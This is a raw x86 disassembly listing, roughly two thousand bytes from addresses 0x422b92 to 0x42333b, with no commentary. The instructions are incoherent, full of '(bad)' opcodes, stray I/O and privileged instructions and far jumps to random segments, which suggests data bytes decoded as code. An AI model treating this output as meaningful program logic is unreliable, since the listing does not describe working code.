  422b92:	shr    DWORD PTR ds:0x6a7310ec,0xfa
  422b99:	int3   
  422b9a:	stos   DWORD PTR es:[edi],eax
  422b9b:	stc    
  422b9c:	shl    BYTE PTR [ebx+0x3c],1
  422b9f:	sti    
  422ba0:	ja     0x422bf3
  422ba2:	dec    eax
  422ba3:	test   al,0xb9
  422ba5:	add    DWORD PTR [ecx+0xa3d58cb],esi
  422bab:	push   es
  422bac:	cdq    
  422bad:	add    al,0xcf
  422baf:	and    BYTE PTR [ecx+0x21],0xbb
  422bb3:	cmp    edi,DWORD PTR [edi]
  422bb5:	inc    ebx
  422bb6:	xchg   ebx,eax
  422bb7:	cmp    BYTE PTR [edi+edx*8],bh
  422bba:	xchg   ebp,eax
  422bbb:	mov    al,ds:0x5794eb81
  422bc0:	je     0x422c29
  422bc2:	mov    cl,0x73
  422bc4:	(bad)  
  422bc5:	icebp  
  422bc6:	dec    ebp
  422bc7:	dec    edi
  422bc8:	cmp    esi,ebp
  422bca:	mov    ah,0x16
  422bcc:	(bad)  [esi]
  422bce:	repz das 
  422bd0:	dec    eax
  422bd1:	(bad)  
  422bd3:	sbb    eax,0x4ecd56a7
  422bd8:	mov    BYTE PTR [ecx-0x78],cl
  422bdb:	test   DWORD PTR [eax-0x6f],edx
  422bde:	jmp    0x3a73c766
  422be3:	sar    ch,cl
  422be5:	adc    eax,0xf899708e
  422bea:	add    eax,0x7ed5ea79
  422bef:	mov    bh,0x0
  422bf1:	ret    
  422bf2:	push   ds
  422bf3:	adc    esi,DWORD PTR [ebx]
  422bf5:	add    DWORD PTR [eax+0x2b],ecx
  422bf8:	arpl   sp,ax
  422bfa:	lods   eax,DWORD PTR ds:[esi]
  422bfb:	pop    edi
  422bfc:	push   ecx
  422bfd:	pop    ss
  422bfe:	or     al,0x91
  422c00:	test   BYTE PTR [esi+0x218848f0],bl
  422c06:	sbb    BYTE PTR [ebx-0x42445e1c],bh
  422c0c:	ret    0x62a5
  422c0f:	sub    bl,BYTE PTR [ebx-0x63bcc5fc]
  422c15:	sbb    al,0xa8
  422c17:	rcr    DWORD PTR [ebx+0x59],0xdb
  422c1b:	hlt    
  422c1c:	sbb    DWORD PTR [ecx+0x7b],esi
  422c1f:	xchg   DWORD PTR [esi],ebx
  422c21:	gs dec edx
  422c23:	aaa    
  422c24:	jo     0x422c74
  422c26:	sbb    BYTE PTR [ebx-0x1b],0x64
  422c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c2b:	fdiv   QWORD PTR [ebx-0x26]
  422c2e:	nop
  422c2f:	or     eax,0x12892e2f
  422c34:	ret    0x37ab
  422c37:	(bad)  [ebx]
  422c39:	adc    ebx,DWORD PTR [ecx-0x7c]
  422c3c:	fdivr  st(1),st
  422c3e:	aas    
  422c3f:	push   ss
  422c40:	clc    
  422c41:	or     eax,0xf771ff3e
  422c46:	les    edi,FWORD PTR [ebp+edi*1-0x4ac62fc6]
  422c4d:	popa   
  422c4e:	in     eax,0xb8
  422c50:	xchg   BYTE PTR [eax+0x3313efb7],dl
  422c56:	cwde   
  422c57:	(bad)  
  422c58:	out    dx,al
  422c59:	mov    esp,DWORD PTR [ebp+0x1a]
  422c5c:	sub    eax,0x17c6b321
  422c61:	jb     0x422cb4
  422c63:	push   cs
  422c64:	cs xchg edx,eax
  422c66:	js     0x422c1c
  422c68:	jmp    0x65c3:0x1ad466b4
  422c6f:	sub    al,ch
  422c71:	push   edx
  422c72:	sub    dl,BYTE PTR [ecx-0x72]
  422c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c76:	les    edi,FWORD PTR [ecx+0x6e54a5e5]
  422c7c:	jg     0x422c2b
  422c7e:	out    dx,al
  422c7f:	sub    edi,DWORD PTR [ebp+0x35]
  422c82:	jecxz  0x422cd3
  422c84:	cmp    eax,0xf7ea8b54
  422c89:	arpl   WORD PTR [ebx],si
  422c8b:	(bad)  
  422c8d:	lock out 0xa6,al
  422c90:	ja     0x422c85
  422c92:	fcmovnu st,st(6)
  422c94:	jge    0x422c7c
  422c96:	mov    esi,DWORD PTR [eax+ebx*8-0x7c]
  422c9a:	pushf  
  422c9b:	jb     0x422cf1
  422c9d:	push   esp
  422c9e:	xchg   esp,eax
  422c9f:	(bad)  
  422ca0:	aas    
  422ca1:	mov    bh,ch
  422ca3:	in     al,dx
  422ca4:	cmp    bl,BYTE PTR [esi-0x44173c75]
  422caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cab:	jae    0x422d20
  422cad:	inc    esi
  422cae:	or     bl,BYTE PTR [edx]
  422cb0:	fs inc esp
  422cb2:	das    
  422cb3:	ins    DWORD PTR es:[edi],dx
  422cb4:	inc    esi
  422cb5:	out    dx,eax
  422cb6:	cmp    eax,0x25a86fab
  422cbb:	and    cl,BYTE PTR es:[edx+0x153a2f66]
  422cc2:	fwait
  422cc3:	test   BYTE PTR [ebp+0x13e10f2b],dl
  422cc9:	hlt    
  422cca:	dec    esi
  422ccb:	jl     0x422ccb
  422ccd:	push   ds
  422cce:	jb     0x422ce9
  422cd0:	mov    esi,0xf2546325
  422cd5:	sub    esp,eax
  422cd7:	sbb    edi,edi
  422cd9:	mov    eax,0xd71ec93d
  422cde:	in     al,dx
  422cdf:	ds push es
  422ce1:	mov    ds,WORD PTR [edi-0x1]
  422ce4:	or     ch,bh
  422ce6:	cmp    bh,BYTE PTR [eax+0x69da0eeb]
  422cec:	ja     0x422d69
  422cee:	stos   DWORD PTR es:[edi],eax
  422cef:	xchg   edi,eax
  422cf0:	fnstenv [ecx]
  422cf2:	sti    
  422cf3:	ins    BYTE PTR es:[edi],dx
  422cf4:	and    edx,DWORD PTR [edi-0x1396e7b7]
  422cfa:	mul    esi
  422cfc:	test   eax,0x58133d9d
  422d01:	(bad)  
  422d02:	push   eax
  422d03:	xor    DWORD PTR [esi+edx*1+0x61],ebp
  422d07:	mov    bl,0x15
  422d09:	adc    al,0x3
  422d0b:	call   0x58499515
  422d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d11:	sub    ecx,DWORD PTR [esi+eiz*1]
  422d14:	cwde   
  422d15:	out    0x2a,eax
  422d17:	pop    es
  422d18:	or     eax,DWORD PTR [edi+0x49]
  422d1b:	add    cl,BYTE PTR [esi+0x47]
  422d1e:	in     eax,0xa8
  422d20:	add    ah,0x70
  422d23:	cmp    cl,al
  422d25:	iret   
  422d26:	xor    esp,DWORD PTR [ecx]
  422d28:	push   edx
  422d29:	xor    BYTE PTR [edx+0x6],0x77
  422d2d:	xchg   edx,eax
  422d2e:	ja     0x422d51
  422d30:	dec    edi
  422d31:	jp     0x422d81
  422d33:	mov    bh,0xa0
  422d35:	fldenv [esi]
  422d37:	sub    DWORD PTR [esi-0x20],0xffffff86
  422d3b:	cmp    DWORD PTR [ebp-0x10],esp
  422d3e:	enter  0x9c59,0x66
  422d42:	dec    esp
  422d43:	daa    
  422d44:	out    0x62,al
  422d46:	dec    esi
  422d47:	mov    esi,ebp
  422d49:	inc    ebx
  422d4a:	jmp    0x5e6f:0xca255c5f
  422d51:	dec    ebp
  422d52:	gs mov dh,0x6
  422d55:	arpl   bx,bp
  422d57:	cmp    ebx,0x4b
  422d5a:	mov    ebp,DWORD PTR [ebp+0x18]
  422d5d:	mov    al,ds:0xa8aaf892
  422d62:	jle    0x422d4a
  422d64:	sub    DWORD PTR [edi],ebx
  422d66:	fwait
  422d67:	loop   0x422d5b
  422d69:	jp     0x422d86
  422d6b:	dec    ecx
  422d6c:	xchg   esp,eax
  422d6d:	or     bl,bl
  422d6f:	sub    BYTE PTR [ebp-0x2c],0xee
  422d73:	test   DWORD PTR fs:[esi-0x1c5682b],edi
  422d7a:	test   al,0x2c
  422d7c:	sub    al,0x1c
  422d7e:	add    eax,0x6640f486
  422d83:	add    eax,0x7757cd58
  422d88:	push   eax
  422d89:	mov    esp,0xffcf6745
  422d8e:	add    ah,BYTE PTR [esi]
  422d90:	mov    esi,0x6a4a25ef
  422d95:	icebp  
  422d96:	push   esi
  422d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d98:	jo     0x422d59
  422d9a:	dec    ebx
  422d9b:	pop    edx
  422d9c:	std    
  422d9d:	inc    esp
  422d9e:	lds    ecx,FWORD PTR [edi-0x765b7e44]
  422da4:	mov    eax,0xe293c42
  422da9:	outs   dx,BYTE PTR ds:[esi]
  422daa:	lea    ebx,[ebx]
  422dac:	pop    edx
  422dad:	mov    ds:0x42051925,al
  422db2:	icebp  
  422db3:	jno    0x422de8
  422db5:	ins    BYTE PTR es:[edi],dx
  422db6:	sub    bl,al
  422db8:	sbb    DWORD PTR [edx+0x7d],0x50
  422dbc:	gs cmp al,0xff
  422dbf:	mov    eax,0xe4a666d4
  422dc4:	mov    ds:0x3f7c8cdf,eax
  422dc9:	mov    edi,0xe8315a72
  422dce:	and    eax,DWORD PTR [esi]
  422dd0:	repz dec eax
  422dd2:	adc    eax,0xad157023
  422dd7:	icebp  
  422dd8:	sbb    eax,0x4213c901
  422ddd:	dec    ebp
  422dde:	(bad)  
  422ddf:	or     esi,edi
  422de1:	neg    BYTE PTR [ecx]
  422de3:	mov    esp,0x36a9d490
  422de8:	mov    edx,0x18b6d174
  422ded:	jmp    0xbdfc5c97
  422df2:	mov    al,dl
  422df4:	push   esp
  422df5:	lea    eax,[ecx]
  422df7:	ret    0xeb
  422dfa:	add    BYTE PTR [eax],al
  422dfc:	gs mov ah,0x18
  422dff:	fcompp 
  422e01:	(bad)  
  422e02:	out    0xbf,eax
  422e04:	gs mov ah,0x46
  422e07:	not    BYTE PTR [eax-0x7bd33314]
  422e0d:	test   al,0x1
  422e0f:	add    BYTE PTR [ebp+0x27000002],al
  422e15:	fidiv  DWORD PTR [ecx]
  422e17:	test   eax,0x912f62ae
  422e1c:	ja     0x422dca
  422e1e:	sbb    ebp,edx
  422e20:	(bad)  
  422e22:	shl    dh,1
  422e24:	mov    esi,0x8e3acf4e
  422e29:	inc    eax
  422e2a:	pop    ds
  422e2b:	dec    ecx
  422e2d:	fisub  DWORD PTR [esi+0x5]
  422e30:	mov    ebx,0x3025f8c0
  422e35:	imul   eax,DWORD PTR [edx+ebx*4+0xc9b9a15],0xffffffd7
  422e3d:	mov    bh,0xec
  422e3f:	mov    eax,ds:0x6501ea21
  422e44:	push   cs
  422e45:	jbe    0x422e38
  422e47:	sahf   
  422e48:	push   0xffffffce
  422e4a:	daa    
  422e4b:	cdq    
  422e4c:	xlat   BYTE PTR ds:[ebx]
  422e4d:	(bad)  
  422e4e:	gs je  0x422e1a
  422e51:	add    esi,DWORD PTR [esi]
  422e53:	xchg   BYTE PTR [edx],bl
  422e55:	mov    ds:0xad728981,al
  422e5a:	aas    
  422e5b:	jmp    0x765a:0xbaacb657
  422e62:	rcr    ch,1
  422e64:	mov    ah,0x4d
  422e66:	shl    esp,cl
  422e68:	mov    ah,0x32
  422e6a:	mov    DWORD PTR [edx-0x2d],edi
  422e6d:	adc    ebp,ebp
  422e6f:	mov    edx,0x4279f034
  422e74:	aaa    
  422e75:	pop    ebp
  422e76:	test   al,0x22
  422e78:	xor    eax,0x1eaf7f8b
  422e7d:	pop    ecx
  422e7e:	pop    edi
  422e7f:	pop    edx
  422e80:	cmp    BYTE PTR [ebx+0x52],dh
  422e83:	fldl2t 
  422e85:	or     DWORD PTR [eax-0x5f],ebx
  422e88:	repnz imul edi,DWORD PTR [esi],0x870f7e1d
  422e8f:	sub    BYTE PTR [eax+0x1],dh
  422e92:	jge    0x422eea
  422e94:	inc    sp
  422e96:	fwait
  422e97:	push   ebp
  422e98:	int    0xb
  422e9a:	in     al,dx
  422e9b:	inc    esi
  422e9c:	dec    ebx
  422e9d:	jno    0x422e53
  422e9f:	iret   
  422ea0:	es stos DWORD PTR es:[edi],eax
  422ea2:	inc    ecx
  422ea3:	sbb    BYTE PTR [ecx],bh
  422ea5:	cmc    
  422ea6:	je     0x422e56
  422ea8:	mov    al,ds:0x739bb378
  422ead:	mov    bl,0x57
  422eaf:	or     eax,0xa554d56f
  422eb4:	test   BYTE PTR [ecx+eiz*2+0x37],bl
  422eb8:	in     al,0x4
  422eba:	(bad)  
  422ebb:	ins    DWORD PTR es:[edi],dx
  422ebc:	push   ebp
  422ebd:	push   esp
  422ebe:	add    eax,0xa9490c18
  422ec3:	mov    al,ds:0xa2bf97f8
  422ec8:	std    
  422ec9:	jmp    0x422e92
  422ecb:	data16 cmp BYTE PTR [esi],bh
  422ece:	test   DWORD PTR [ebp-0x67],edi
  422ed1:	mov    eax,ds:0x4ad97a5d
  422ed6:	loop   0x422ef1
  422ed8:	push   edi
  422ed9:	jecxz  0x422f44
  422edb:	mov    bh,0xc3
  422edd:	xor    DWORD PTR [ebp-0x2],edx
  422ee0:	mov    bh,0xa6
  422ee2:	popf   
  422ee3:	(bad)  
  422ee4:	cmc    
  422ee5:	add    cl,BYTE PTR [esi+0x14]
  422ee8:	jp     0x422f57
  422eea:	or     ebx,ebx
  422eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eed:	xchg   BYTE PTR [ebx],ch
  422eef:	sar    BYTE PTR [eax+ebp*1-0x58e87c4f],0xa1
  422ef7:	push   ds
  422ef8:	xchg   esi,eax
  422ef9:	ja     0x422f12
  422efb:	loop   0x422ec9
  422efd:	or     DWORD PTR [eax+0x405a12ad],edi
  422f03:	(bad)  
  422f04:	loop   0x422f61
  422f06:	dec    esp
  422f07:	xchg   DWORD PTR [ebp-0xaace113],ebp
  422f0d:	arpl   WORD PTR [esi-0x57],cx
  422f10:	pop    ss
  422f11:	fistp  WORD PTR [ebx-0x26]
  422f14:	outs   dx,BYTE PTR ds:[esi]
  422f15:	cdq    
  422f16:	or     ebp,0x50
  422f19:	lods   eax,DWORD PTR ds:[esi]
  422f1a:	enter  0x6af0,0x4
  422f1e:	sub    cl,dl
  422f20:	test   edi,ebp
  422f22:	push   0xffffff89
  422f24:	iret   
  422f25:	sub    ah,bh
  422f27:	repnz fdiv DWORD PTR [esi]
  422f2a:	adc    eax,0x76fc4f15
  422f2f:	or     BYTE PTR [edx+0x3d],dh
  422f32:	pop    ebx
  422f33:	add    bl,ch
  422f35:	pop    esi
  422f36:	mov    bh,0x12
  422f38:	ja     0x422f36
  422f3a:	adc    al,BYTE PTR ds:0x6002386b
  422f40:	xor    eax,0x1ea5b37f
  422f45:	dec    esp
  422f46:	lea    ebp,[esp+ebx*1+0xd]
  422f4a:	in     al,0x78
  422f4c:	push   ds
  422f4d:	mov    eax,0x473ffca3
  422f52:	inc    esp
  422f53:	xor    ecx,DWORD PTR [ecx]
  422f55:	neg    BYTE PTR [eax]
  422f57:	rol    BYTE PTR [ebp-0x6c],cl
  422f5a:	adc    eax,0xf8717f8a
  422f5f:	cs xor eax,ebx
  422f62:	fdivr  DWORD PTR [ebx+0x2d449794]
  422f68:	or     bh,ch
  422f6a:	cwde   
  422f6b:	jle    0x422fb0
  422f6d:	jle    0x422fea
  422f6f:	stos   DWORD PTR es:[edi],eax
  422f70:	xor    BYTE PTR [ebx+0xa],ch
  422f73:	pop    esp
  422f74:	mov    edx,0x646d14aa
  422f79:	mov    BYTE PTR [edi],bh
  422f7b:	aad    0x72
  422f7d:	(bad)
  422f80:	shl    BYTE PTR [edx-0x72],0x5b
  422f84:	aam    0xf8
  422f86:	or     al,0x97
  422f88:	hlt    
  422f89:	xchg   ecx,eax
  422f8a:	ror    DWORD PTR [ebx],cl
  422f8c:	mov    esp,0xb6b1d446
  422f91:	fisttp WORD PTR [ebp+0x4f8ad456]
  422f97:	mov    bl,BYTE PTR [edi+esi*2-0x37b8b6]
  422f9e:	jae    0x422f80
  422fa0:	or     BYTE PTR [eax],ah
  422fa2:	add    al,0x10
  422fa4:	xchg   ebp,eax
  422fa5:	sbb    ebx,ebp
  422fa7:	loop   0x422f85
  422fa9:	xchg   cl,bl
  422fab:	scas   eax,DWORD PTR es:[edi]
  422fac:	push   edx
  422fad:	arpl   WORD PTR [esi],dx
  422faf:	dec    eax
  422fb0:	gs neg ch
  422fb3:	or     edx,ebx
  422fb5:	ror    ecx,0x48
  422fb8:	(bad)  
  422fb9:	push   ds
  422fba:	pop    ecx
  422fbb:	add    ch,BYTE PTR [edi+0x51]
  422fbe:	xor    BYTE PTR [ebx+0x45],0x1c
  422fc2:	inc    ecx
  422fc3:	xor    BYTE PTR [ebx],dl
  422fc5:	in     eax,dx
  422fc6:	or     edx,DWORD PTR [bp+di-0x78ea]
  422fcb:	les    ebx,FWORD PTR [ebx+edi*4]
  422fce:	or     BYTE PTR [edx+0xd],bl
  422fd1:	(bad)  
  422fd2:	mov    BYTE PTR [eax],bh
  422fd4:	jae    0x422fd1
  422fd6:	add    DWORD PTR [edx-0x713164bd],esp
  422fdc:	cmp    BYTE PTR [edx*2+0x198166e9],0xa3
  422fe4:	jl     0x422f91
  422fe6:	add    ah,0x13
  422fe9:	xchg   esp,eax
  422fea:	addr16 xchg edi,eax
  422fec:	lock iret 
  422fee:	xchg   ebp,eax
  422fef:	lahf   
  422ff0:	into   
  422ff1:	and    edx,DWORD PTR [edx]
  422ff3:	shl    ch,1
  422ff5:	adc    eax,esi
  422ff7:	adc    edx,DWORD PTR [ebx-0x58]
  422ffa:	shr    DWORD PTR [edx+0xc],1
  422ffd:	lahf   
  422ffe:	stos   DWORD PTR es:[edi],eax
  422fff:	adc    eax,0x276ffdee
  423004:	(bad)  [edx]
  423006:	fsubr  QWORD PTR [ebx+0x7f]
  423009:	mov    ds:0xe4a5ddeb,eax
  42300e:	push   0xd80c2176
  423013:	mov    ebp,DWORD PTR [ebx]
  423015:	mov    BYTE PTR ds:0x8f03b931,ah
  42301b:	iret   
  42301c:	je     0x422fcb
  42301e:	inc    edi
  42301f:	xchg   cl,bl
  423021:	inc    edi
  423022:	add    ah,ch
  423024:	mov    cs,WORD PTR [edi-0x6f02d4f7]
  42302a:	dec    ecx
  42302b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42302c:	stc    
  42302d:	cmc    
  42302e:	mov    ds:0xff74c9a2,al
  423033:	dec    ebx
  423034:	cwde   
  423035:	push   cs
  423036:	xchg   ebx,eax
  423037:	add    eax,0xa042f7ed
  42303c:	addr16 mov al,ds:0x4840
  423040:	adc    BYTE PTR [eax],cl
  423042:	aaa    
  423043:	add    bh,ah
  423045:	push   ebx
  423046:	and    bh,BYTE PTR [ebx]
  423048:	jge    0x4230c1
  42304a:	mov    ds:0x774ab9fe,eax
  42304f:	aas    
  423050:	inc    esi
  423051:	ret    
  423052:	add    eax,0x8e4a8fd3
  423057:	test   DWORD PTR [edi-0x7a],edi
  42305a:	mov    ecx,0x20f35428
  42305f:	mov    al,ds:0x80fdb7e7
  423064:	ja     0x422ff2
  423066:	inc    esi
  423067:	test   al,0x49
  423069:	push   ecx
  42306a:	(bad)  
  42306c:	clc    
  42306d:	enter  0xd079,0xf7
  423071:	inc    esi
  423072:	push   ecx
  423073:	inc    ebp
  423074:	or     dh,BYTE PTR [esi]
  423076:	pop    ebp
  423077:	mov    esi,0x67cc0f35
  42307c:	scas   al,BYTE PTR es:[edi]
  42307d:	cmp    al,0x8
  42307f:	inc    edx
  423080:	lods   al,BYTE PTR ds:[esi]
  423081:	pop    esp
  423082:	aas    
  423083:	mov    bl,0xb3
  423085:	mov    edi,0x9216ee2c
  42308a:	cld    
  42308b:	jnp    0x42307b
  42308d:	pop    es
  42308e:	int    0x77
  423090:	lahf   
  423091:	or     ebp,0xffffffbe
  423094:	mov    eax,0x81b45bfe
  423099:	add    BYTE PTR [eax],al
  42309b:	add    BYTE PTR [edx],dl
  42309d:	fsub   DWORD PTR [ebx+0x72]
  4230a0:	jmp    0x42309d
  4230a2:	adc    edi,eax
  4230a4:	sub    edi,DWORD PTR [ebx+0x679388f7]
  4230aa:	iret   
  4230ab:	adc    al,0x9
  4230ad:	stos   DWORD PTR es:[edi],eax
  4230ae:	add    DWORD PTR [eax],eax
  4230b0:	test   DWORD PTR [edx],eax
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	lods   eax,DWORD PTR ds:[esi]
  4230b5:	cld    
  4230b6:	jl     0x423133
  4230b8:	fstp   QWORD PTR [ecx+0x353471d5]
  4230be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bf:	adc    ecx,DWORD PTR [edx-0x1c]
  4230c2:	jo     0x4230a0
  4230c4:	jo     0x423071
  4230c6:	(bad)  
  4230c7:	or     DWORD PTR [ebx],edx
  4230c9:	mov    eax,fs
  4230cb:	dec    ebx
  4230cc:	sbb    eax,0x43041189
  4230d1:	out    dx,eax
  4230d2:	push   0x42
  4230d4:	ss shl bl,cl
  4230d7:	mov    dh,0x59
  4230d9:	mov    ecx,0xcf35c808
  4230de:	sbb    eax,0x87f800d
  4230e3:	adc    BYTE PTR [esi-0x2a37681b],0x5a
  4230ea:	sub    ecx,DWORD PTR [edi]
  4230ec:	es mov cl,0x9e
  4230ef:	fucomi st,st(6)
  4230f1:	xchg   ecx,eax
  4230f2:	fwait
  4230f3:	sub    edi,ebp
  4230f5:	nop
  4230f6:	mov    al,0x6
  4230f8:	cld    
  4230f9:	popa   
  4230fa:	and    bh,BYTE PTR [ebp+ebx*2+0x654a67da]
  423101:	or     al,0x80
  423103:	popf   
  423104:	inc    esp
  423105:	cmp    BYTE PTR [esi+0x4c],dl
  423108:	dec    BYTE PTR [ebp-0x14]
  42310b:	sbb    DWORD PTR [ebx-0x5c74d517],eax
  423111:	lahf   
  423112:	xchg   edi,eax
  423113:	jb     0x423108
  423115:	mov    dl,0x61
  423117:	cmp    ebp,ebp
  423119:	inc    edi
  42311a:	addr16 cmp eax,0x478c2860
  423120:	push   edi
  423121:	in     al,0x3b
  423123:	push   ds
  423124:	xor    eax,0x9dc0f9eb
  423129:	and    edi,esi
  42312b:	mov    dh,0xb2
  42312d:	cmp    ebx,DWORD PTR [eax]
  42312f:	mov    ds:0xcae0b52f,al
  423134:	in     al,dx
  423135:	sahf   
  423136:	adc    al,0xec
  423138:	cmp    al,0x2b
  42313a:	add    eax,0xdf99e8de
  42313f:	pop    esp
  423140:	enter  0xee00,0xb1
  423144:	push   0xc
  423146:	lods   eax,DWORD PTR ds:[esi]
  423147:	jnp    0x42316a
  423149:	repz inc esi
  42314b:	fcom   DWORD PTR [esi]
  42314d:	je     0x423121
  42314f:	jo     0x42310d
  423151:	(bad)  [ebx-0x19419288]
  423157:	sbb    eax,0x997c250f
  42315c:	mov    edi,0xa91ce52b
  423161:	(bad)  
  423162:	or     ecx,DWORD PTR [ebx-0x965c7ca]
  423168:	dec    eax
  423169:	mov    eax,DWORD PTR [edx+0x2ffcad03]
  42316f:	(bad)  
  423170:	mov    ah,0x19
  423172:	jno    0x4231ea
  423174:	mov    edi,0xb4026105
  423179:	dec    ebp
  42317a:	pop    esi
  42317b:	pushf  
  42317c:	es (bad) 
  42317f:	cmp    DWORD PTR [edi+ecx*8],0x201cbb49
  423186:	out    0x6f,eax
  423188:	jl     0x423180
  42318a:	sub    al,0x9b
  42318c:	xchg   ecx,eax
  42318d:	dec    edi
  42318e:	das    
  42318f:	and    BYTE PTR [esi+0xe147767],ch
  423195:	loope  0x42317c
  423197:	jno    0x423161
  423199:	retf   0xfab8
  42319c:	(bad)  
  42319d:	jae    0x423210
  42319f:	sub    cl,cl
  4231a1:	adc    al,0x7
  4231a3:	(bad)  
  4231a4:	jecxz  0x42320b
  4231a6:	and    ebx,eax
  4231a8:	sub    BYTE PTR [edi+0x4742292f],0x85
  4231af:	sub    edx,DWORD PTR [eax-0x13]
  4231b2:	xor    eax,DWORD PTR [edx-0x110787e7]
  4231b8:	mov    ds,ebx
  4231ba:	fwait
  4231bb:	(bad)  
  4231bc:	jns    0x423222
  4231be:	jge    0x42317e
  4231c0:	cwde   
  4231c1:	jmp    0x2e39cffe
  4231c6:	mov    es,WORD PTR [esi+eiz*4-0x229f40b]
  4231cd:	xor    al,BYTE PTR [ecx]
  4231cf:	cmp    ecx,0x46
  4231d2:	xchg   edx,eax
  4231d3:	fistp  WORD PTR [eax]
  4231d5:	cmc    
  4231d6:	std    
  4231d7:	in     eax,0xe3
  4231d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231da:	int3   
  4231db:	push   eax
  4231dc:	inc    esi
  4231dd:	out    dx,eax
  4231de:	jg     0x423231
  4231e0:	bsr    esi,ebp
  4231e3:	ret    
  4231e4:	push   eax
  4231e5:	fs aaa 
  4231e7:	add    BYTE PTR [eax+0x2549f74c],al
  4231ed:	hlt    
  4231ee:	cld    
  4231ef:	fsub   DWORD PTR [ebp-0x18]
  4231f2:	dec    eax
  4231f3:	xchg   DWORD PTR [eax],esp
  4231f5:	add    eax,0xf9cebba7
  4231fa:	int3   
  4231fb:	mov    ss,WORD PTR [eax-0x29]
  4231fe:	mov    ebp,edi
  423200:	push   ebp
  423201:	mov    ebp,0xf86c6e95
  423206:	push   eax
  423207:	jae    0x423249
  423209:	ss stc 
  42320b:	int    0x40
  42320d:	sahf   
  42320e:	xchg   ebx,eax
  42320f:	jae    0x42327e
  423211:	mov    esi,0x5c4e9263
  423216:	and    ch,al
  423218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423219:	xor    DWORD PTR [ebp+0x7b],0xffffffe1
  42321d:	or     DWORD PTR [eax+0x69],ebp
  423220:	add    DWORD PTR [ebx-0x3b],esp
  423223:	mov    cl,0x11
  423225:	jns    0x4231fc
  423227:	xchg   DWORD PTR [eax-0x5d],edx
  42322a:	pushf  
  42322b:	or     al,0x93
  42322d:	fsubr  DWORD PTR [eax+ebx*2+0x2690c629]
  423234:	test   eax,0x2edd3fe4
  423239:	icebp  
  42323a:	dec    ebp
  42323b:	addr16 cwde 
  42323d:	repnz cmp edi,DWORD PTR [edx+0x5c]
  423241:	jg     0x423210
  423243:	mov    ebx,ecx
  423245:	stos   BYTE PTR es:[edi],al
  423246:	repnz mov ebp,edi
  423249:	dec    ebx
  42324a:	aas    
  42324b:	or     al,0x86
  42324d:	pop    esp
  42324e:	cmc    
  42324f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423250:	cmp    al,0xdb
  423252:	push   cs
  423253:	test   DWORD PTR [esi+0x6a],ecx
  423256:	push   ebp
  423257:	retf   
  423258:	mov    esp,0xa1c6443c
  42325d:	xor    BYTE PTR [edx],ah
  42325f:	rcl    BYTE PTR [esi-0x46],cl
  423262:	cmc    
  423263:	xchg   BYTE PTR [edi-0xeb6bb3d],ah
  423269:	jp     0x423230
  42326b:	sub    ebp,DWORD PTR [ebx]
  42326d:	xor    DWORD PTR [ebx],ebx
  42326f:	and    edx,DWORD PTR [eax]
  423271:	hlt    
  423272:	inc    edx
  423273:	mov    esi,0x9229ca65
  423278:	inc    esp
  423279:	test   DWORD PTR ds:0xcd59c11c,0x55e64aaf
  423283:	dec    edi
  423284:	int3   
  423285:	in     eax,dx
  423286:	rcr    BYTE PTR [esi-0x6d6050c9],cl
  42328c:	pop    ebx
  42328d:	sbb    ebx,esp
  42328f:	xor    eax,0xc9216f25
  423294:	iret   
  423295:	dec    edi
  423296:	push   edi
  423297:	iret   
  423298:	inc    eax
  423299:	js     0x42324b
  42329b:	ror    DWORD PTR fs:[edx+0x50],1
  42329f:	shl    esi,0x54
  4232a2:	mov    ah,0xfe
  4232a4:	and    eax,0xa1544137
  4232a9:	fiadd  DWORD PTR ds:0x11e66cb1
  4232af:	ret    
  4232b0:	sub    BYTE PTR [edx-0x962c299],al
  4232b6:	jecxz  0x4232cd
  4232b8:	(bad)  
  4232b9:	test   al,0x4e
  4232bb:	shr    esi,1
  4232bd:	dec    ebp
  4232be:	or     ch,bh
  4232c0:	aaa    
  4232c1:	nop
  4232c2:	xchg   edx,eax
  4232c3:	int    0xaf
  4232c5:	fisub  WORD PTR [eax-0x4a489a60]
  4232cb:	jno    0x4232a8
  4232cd:	neg    ecx
  4232cf:	push   ecx
  4232d0:	js     0x4232ab
  4232d2:	dec    ebp
  4232d3:	lock push ss
  4232d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232d6:	out    dx,eax
  4232d7:	mov    edi,0xbc8999d3
  4232dc:	push   ebp
  4232dd:	inc    ebp
  4232de:	xchg   BYTE PTR [ebx+edi*4],al
  4232e1:	fisttp QWORD PTR [edi-0x3434f7d8]
  4232e7:	popf   
  4232e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232e9:	mov    ds:0xf14b9e20,eax
  4232ee:	or     DWORD PTR [edi+0x3c],esp
  4232f1:	sbb    BYTE PTR [ebx+0x3e54e140],dh
  4232f7:	dec    esi
  4232f8:	mov    cl,0x88
  4232fa:	out    0x3f,al
  4232fc:	jmp    0xb954:0x673322ce
  423303:	pop    esp
  423304:	icebp  
  423305:	je     0x4232ea
  423307:	jns    0x4232de
  423309:	int    0x63
  42330b:	dec    edi
  42330c:	adc    BYTE PTR [ecx+0x164c8864],dl
  423312:	test   BYTE PTR [esi],ch
  423314:	mov    cl,0xf1
  423316:	stos   DWORD PTR es:[edi],eax
  423317:	je     0x423346
  423319:	inc    esi
  42331a:	inc    ebx
  42331b:	sbb    eax,0x6392f76d
  423320:	out    0x24,eax
  423322:	mov    edx,0xdb29e424
  423327:	and    esp,edi
  423329:	pop    esi
  42332a:	psubusb mm3,QWORD PTR [ecx]
  42332d:	jecxz  0x42339c
  42332f:	push   ecx
  423330:	ds xor eax,0x9ce97a98
  423336:	in     eax,dx
  423337:	aaa    
  423338:	scas   eax,DWORD PTR es:[edi]
  423339:	add    BYTE PTR [eax],al
  42333b:	add    BYTE PTR [esi],cl
